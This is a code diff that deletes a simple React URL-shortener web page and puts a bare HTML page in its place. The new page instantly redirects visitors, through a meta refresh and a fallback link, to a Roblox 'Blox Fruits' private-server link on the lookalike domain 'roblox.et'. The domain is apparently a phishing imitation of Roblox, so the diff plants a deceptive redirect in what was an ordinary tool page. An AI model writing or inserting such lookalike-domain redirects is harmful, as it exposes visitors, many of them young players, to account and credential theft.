@@ -1,73 +1,10 @@
-<!DOCTYPE html><html lang="en"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>URL Shortener</title>
-  <script defer src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
-  <script defer src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
-  <script defer src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-  <script src="https://cdn.tailwindcss.com"></script>
-</head><body class="bg-gray-100">
-  <div id="root"></div>  <script type="text/babel">
-    const { useState } = React;
-
-    function URLShortener() {
-      const [originalURL, setOriginalURL] = useState('');
-      const [shortURL, setShortURL] = useState('');
-      const [customPath, setCustomPath] = useState('');
-      const [domain, setDomain] = useState('');
-
-      const handleShorten = () => {
-        if (!originalURL) return;
-
-        const base = domain || window.location.origin;
-        const path = customPath || Math.random().toString(36).substring(2, 8);
-        setShortURL(`${base}/${path}`);
-      };
-
-      return (
-        <div className="flex justify-center items-center min-h-screen p-4">
-          <div className="w-full max-w-md bg-white shadow-2xl rounded-2xl p-6">
-            <h1 className="text-2xl font-bold text-center mb-4">URL Shortener</h1>
-            <input
-              type="text"
-              placeholder="Enter original URL"
-              value={originalURL}
-              onChange={(e) => setOriginalURL(e.target.value)}
-              className="w-full p-2 border rounded mb-3"
-            />
-            <input
-              type="text"
-              placeholder="Custom path (optional)"
-              value={customPath}
-              onChange={(e) => setCustomPath(e.target.value)}
-              className="w-full p-2 border rounded mb-3"
-            />
-            <input
-              type="text"
-              placeholder="Custom domain (optional)"
-              value={domain}
-              onChange={(e) => setDomain(e.target.value)}
-              className="w-full p-2 border rounded mb-3"
-            />
-            <button
-              onClick={handleShorten}
-              className="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700"
-            >
-              Shorten URL
-            </button>
-
-            {shortURL && (
-              <div className="mt-4 text-center">
-                <p className="text-sm text-gray-500">Your shortened URL:</p>
-                <a href={shortURL} target="_blank" rel="noopener noreferrer" className="text-blue-600 underline break-all">
-                  {shortURL}
-                </a>
-              </div>
-            )}
-          </div>
-        </div>
-      );
-    }
-
-    ReactDOM.createRoot(document.getElementById('root')).render(<URLShortener />);
-  </script></body></html>
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0; url=https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <p>If you are not redirected automatically, <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756">click here</a>.</p>
+</body>
+</html>
